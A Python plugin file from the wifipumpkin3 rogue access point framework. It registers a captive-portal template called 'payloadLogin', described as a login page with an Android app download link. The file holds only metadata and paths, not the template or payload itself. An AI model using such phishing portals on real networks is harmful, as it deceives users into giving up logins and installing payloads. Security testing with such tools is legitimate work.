from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C

# This file is part of the wifipumpkin3 Open Source Project.
# wifipumpkin3 is licensed under the Apache 2.0.

# Copyright 2020 P0cL4bs Team - Marcos Bomfim (mh4x0f)

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

class payloadLogin(CaptiveTemplatePlugin):
    Name = "payloadLogin"
    Version = "1.0"
    Description = "General Login page with android app download link"
    Author = "debasishdastrp"
    TemplatePath = C.TEMPLATES_FLASK + "templates/payloadLogin"
    StaticPath = C.TEMPLATES_FLASK + "templates/payloadLogin/static"
    Preview = C.TEMPLATES_FLASK + "templates/payloadLogin/preview.png"
        
